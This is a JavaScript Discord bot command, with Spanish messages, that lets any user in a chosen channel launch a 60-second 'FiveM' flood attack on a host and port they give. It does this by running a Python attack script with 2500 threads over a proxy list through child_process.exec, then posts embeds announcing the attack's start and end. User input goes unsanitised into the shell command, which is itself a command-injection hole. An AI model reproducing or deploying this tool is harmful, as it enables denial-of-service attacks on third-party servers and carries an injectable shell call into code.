const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Formato ;fivem 1.1.1.1:80`")
	.setFooter("Por favor no ataque sitios web con dominio .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`python3 start.py FIVEM ${host}:${port} 2500 60 0 proxy.txt`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Ataque detenido ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**► ¡Ataque finalizado 💥**")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Iniciando ataque ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**Usuario**: `" + message.author.username + "` \n **Servidor**: `" + host + "` \n **Puerto**: `" + port + "` \n **Método**: `FiveM Ping Protocol 💥` \n **Tiempo**: `60 segundos 🕒`")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['fivem'],
  permLevel: 0
}

exports.help = {
  name: 'fivem',
  description: 'Mac',
  usage: 'fivem'
}